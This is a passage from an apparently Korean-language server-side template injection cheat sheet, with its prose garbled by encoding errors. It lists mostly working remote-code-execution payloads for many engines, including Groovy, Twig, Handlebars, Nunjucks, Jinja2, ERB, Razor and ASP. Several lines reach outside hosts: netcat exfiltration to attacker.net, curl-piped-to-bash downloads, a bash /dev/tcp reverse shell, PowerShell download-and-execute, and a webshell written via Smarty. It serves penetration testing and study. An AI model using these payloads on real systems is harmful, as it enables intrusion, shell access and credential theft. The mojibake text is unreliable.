Expression Language (EL)ì€ JavaEEì—ì„œ í”„ë ˆì  í…Œì´ì…˜ ë ˆì´ì–´(ì›¹ í˜ì´ì§€ì™€ ê°™ì€)ì™€ ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œì§(ê´€ë¦¬ë˜ëŠ” ë¹ˆê³¼ ê°™ì€) ê°„ì˜ ìƒí˜¸ì‘ìš©ì„ ì´‰ì§„í•˜ëŠ” ê¸°ë³¸ ê¸°ëŠ¥ì…ë‹ˆë‹¤. ì—¬ëŸ¬ JavaEE ê¸°ìˆ ì—ì„œ ì´ í†µì‹ ì„ ê°„ì†Œí™”í•˜ê¸° ìœ„í•´ ê´‘ë²”ìœ„í•˜ê²Œ ì‚¬ìš©ë©ë‹ˆë‹¤. ELì„ í™œìš©í•˜ëŠ” ì£¼ìš” JavaEE ê¸°ìˆ ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **JavaServer Faces (JSF)**: JSF í˜ì´ì§€ì˜ êµ¬ì„± ìš”ì†Œë¥¼ í•´ë‹¹ ë°±ì—”ë“œ ë°ì´í„° ë° ì‘ì—…ì— ë°”ì¸ë”©í•˜ê¸° ìœ„í•´ ELì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **JavaServer Pages (JSP)**: JSPì—ì„œ ë°ì´í„°ì— ì ‘ê·¼í•˜ê³  ì¡°ì‘í•˜ê¸° ìœ„í•´ ELì„ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ ìš”ì†Œë¥¼ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°ì´í„°ì— ì‰½ê²Œ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Java EEë¥¼ ìœ„í•œ ì»¨í…ìŠ¤íŠ¸ ë° ì˜ì¡´ì„± ì£¼ì… (CDI)**: ELì€ CDIì™€ í†µí•©ë˜ì–´ ì›¹ ë ˆì´ì–´ì™€ ê´€ë¦¬ë˜ëŠ” ë¹ˆ ê°„ì˜ ì›í™œí•œ ìƒí˜¸ì‘ìš©ì„ í—ˆìš©í•˜ì—¬ ë³´ë‹¤ ì¼ê´€ëœ ì• í”Œë¦¬ì¼€ì´ì…˜ êµ¬ì¡°ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤.

**EL ì¸í„°í”„ë¦¬í„°ì˜ ì•…ìš©**ì— ëŒ€í•´ ë” ì•Œì•„ë³´ë ¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

ë‹¤ìŒ ë³´ì•ˆ ê´€ë¦¬ì ìš°íšŒëŠ” ì´ [**ì‘ì„±ë¬¼**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³ , ì´ ì»¨ê·¸ë ˆìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**ë” ë§ì€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ì˜ Smarty ì„¹ì…˜
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - í…œí”Œë¦¿ í˜•ì‹**
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**ë” ë§ì€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ì˜ Twig ë° Twig (Sandboxed) ì„¹ì…˜
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

PlatesëŠ” PHPì— ê³ ìœ í•œ í…œí”Œë¦¿ ì—”ì§„ìœ¼ë¡œ, Twigì—ì„œ ì˜ê°ì„ ë°›ì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ìƒˆë¡œìš´ êµ¬ë¬¸ì„ ë„ì…í•˜ëŠ” Twigì™€ ë‹¬ë¦¬, PlatesëŠ” í…œí”Œë¦¿ì—ì„œ ê¸°ë³¸ PHP ì½”ë“œë¥¼ í™œìš©í•˜ì—¬ PHP ê°œë°œìì—ê²Œ ì§ê´€ì ì…ë‹ˆë‹¤.

Controller:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
í˜ì´ì§€ í…œí”Œë¦¿:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
ë ˆì´ì•„ì›ƒ í…œí”Œë¦¿:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib ë° HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)ëŠ” PHPlibì™€ ë™ì¼í•˜ì§€ë§Œ Pearë¡œ í¬íŒ…ë˜ì—ˆìŠµë‹ˆë‹¤.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
`authors.php`
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html\_template\_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html\_template\_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**ë” ë§ì€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ì˜ Jade ì„¹ì…˜
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) ëŠ” XML íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ì„œë¥¼ ì—¬ëŸ¬ ë¶€ë¶„ìœ¼ë¡œ ë‚˜ëˆ„ëŠ” ë¹„ì»´íŒŒì¼ PHP í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

ê²½ë¡œ íƒìƒ‰ (ìì„¸í•œ ì •ë³´ëŠ” [ì—¬ê¸°](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)ì—ì„œ í™•ì¸í•˜ì„¸ìš”).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= ì˜¤ë¥˜
* ${7\*7} = ${7\*7}
* ì—†ìŒ
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**ë” ë§ì€ ì •ë³´**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **í…œí”Œë¦¿** | **ì„¤ëª…**                               |
| ---------- | ------------------------------------- |
|            | ì¶œë ¥ í‰ê°€ ë° ë Œë”ë§                   |
|            | HTML ì¸ì½”ë”©ëœ ì¶œë ¥ í‰ê°€ ë° ë Œë”ë§     |
|            | ì£¼ì„                                  |
| ë°         | ì½”ë“œ í—ˆìš© (ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë¨)     |

* \= 49

**í´ë¼ì´ì–¸íŠ¸ ì¸¡**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**ì„œë²„ ì‚¬ì´ë“œ**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**ë” ë§ì€ ì •ë³´**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**ì˜ˆì œ ì„œë²„ ì‚¬ì´ë“œ ë Œë”**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**ë” ë§ì€ ì •ë³´**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = ì¶œë ¥ ì—†ìŒ
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = ì˜¤ë¥˜
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**ë” ë§ì€ ì •ë³´**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (ë£¨ë¹„)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (ë£¨ë¹„)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ pythonì—ì„œ **ìƒŒë“œë°•ìŠ¤ë¥¼ ìš°íšŒí•˜ëŠ” ì„ì˜ ëª…ë ¹ ì‹¤í–‰**ì— ëŒ€í•œ ìš”ë ¹ì„ ë°°ì›Œë³´ì„¸ìš”:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}






{{os.system('whoami')}}
{{os.system('whoami')}}
```
**ë” ë§ì€ ì •ë³´**

* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[ê³µì‹ ì›¹ì‚¬ì´íŠ¸](http://jinja.pocoo.org)

> Jinja2ëŠ” Pythonì„ ìœ„í•œ ì™„ì „í•œ ê¸°ëŠ¥ì˜ í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. ì™„ì „í•œ ìœ ë‹ˆì½”ë“œ ì§€ì›, ì„ íƒì  í†µí•© ìƒŒë“œë°•ìŠ¤ ì‹¤í–‰ í™˜ê²½ì„ ì œê³µí•˜ë©°, ë„ë¦¬ ì‚¬ìš©ë˜ê³  BSD ë¼ì´ì„¼ìŠ¤ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.

* `{{7*7}} = Error`
* `${7*7} = ${7*7}`
* `{{foobar}} Nothing`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}






{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - í…œí”Œë¦¿ í˜•ì‹**
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCEëŠ”**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`ì— ì˜ì¡´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinjaë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

ë‹¤ë¥¸ í˜ì´ë¡œë“œëŠ” [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**ë” ë§ì€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= ì„±ê³µ`
* `@() <= ì„±ê³µ`
* `@("{{code}}") <= ì„±ê³µ`
* `@ <= ì„±ê³µ`
* `@{} <= ì˜¤ë¥˜!`
* `@{ <= ì˜¤ë¥˜!`
* `@(1+2)`
* `@( //C#ì½”ë“œ )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
* `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NET `System.Diagnostics.Process.Start` ë©”ì„œë“œëŠ” ì„œë²„ì—ì„œ ëª¨ë“  í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹œì‘í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ë”°ë¼ì„œ ì›¹ì‰˜ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ì•± ì˜ˆì œëŠ” [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë” ë§ì€ ì •ë³´**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = ì—†ìŒ
* `<%= response.write(date()) %>` = \<Date>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**ë” ë§ì€ ì •ë³´**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

ë¹„ë¡ Perlì´ì§€ë§Œ Rubyì˜ ERBì™€ ê°™ì€ íƒœê·¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```
<%= perl code %>
<% perl code %>
```
### SSTI in GO

Goì˜ í…œí”Œë¦¿ ì—”ì§„ì—ì„œ ì‚¬ìš© í™•ì¸ì€ íŠ¹ì • í˜ì´ë¡œë“œë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* `{{ . }}`: ë°ì´í„° êµ¬ì¡° ì…ë ¥ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `Password` ì†ì„±ì´ ìˆëŠ” ê°ì²´ê°€ ì „ë‹¬ë˜ë©´, `{{ .Password }}`ê°€ ì´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `{{printf "%s" "ssti" }}`: ë¬¸ìì—´ "ssti"ë¥¼ í‘œì‹œí•  ê²ƒìœ¼ë¡œ ì˜ˆìƒë©ë‹ˆë‹¤.
* `{{html "ssti"}}`, `{{js "ssti"}}`: ì´ í˜ì´ë¡œë“œëŠ” "html" ë˜ëŠ” "js"ë¥¼ ì¶”ê°€í•˜ì§€ ì•Šê³  "ssti"ë¥¼ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤. ì¶”ê°€ ì§€ì¹¨ì€ Go ë¬¸ì„œì—ì„œ [ì—¬ê¸°](https://golang.org/pkg/text/template)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**XSS Exploitation**

`text/template` íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ë©´ í˜ì´ë¡œë“œë¥¼ ì§ì ‘ ì‚½ì…í•˜ì—¬ XSSë¥¼ ê°„ë‹¨í•˜ê²Œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°˜ë©´, `html/template` íŒ¨í‚¤ì§€ëŠ” ì‘ë‹µì„ ì¸ì½”ë”©í•˜ì—¬ ì´ë¥¼ ë°©ì§€í•©ë‹ˆë‹¤ (ì˜ˆ: `{{"<script>alert(1)</script>"}}`ëŠ” `&lt;script&gt;alert(1)&lt;/script&gt;`ë¡œ ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤). ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³  Goì—ì„œ í…œí”Œë¦¿ ì •ì˜ ë° í˜¸ì¶œì€ ì´ ì¸ì½”ë”©ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: \{{define "T1"\}}alert(1)\{{end\}} \{{template "T1"\}}

vbnet Copy code

**RCE Exploitation**

RCE ìµìŠ¤í”Œë¡œì‡ì€ `html/template`ì™€ `text/template` ê°„ì— ìƒë‹¹íˆ ë‹¤ë¦…ë‹ˆë‹¤. `text/template` ëª¨ë“ˆì€ "call" ê°’ì„ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  ê³µê°œ í•¨ìˆ˜ë¥¼ ì§ì ‘ í˜¸ì¶œí•  ìˆ˜ ìˆì§€ë§Œ, `html/template`ì—ì„œëŠ” í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ëª¨ë“ˆì— ëŒ€í•œ ë¬¸ì„œëŠ” [html/templateì— ëŒ€í•œ ì—¬ê¸°](https://golang.org/pkg/html/template/)ì™€ [text/templateì— ëŒ€í•œ ì—¬ê¸°](https://golang.org/pkg/text/template/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

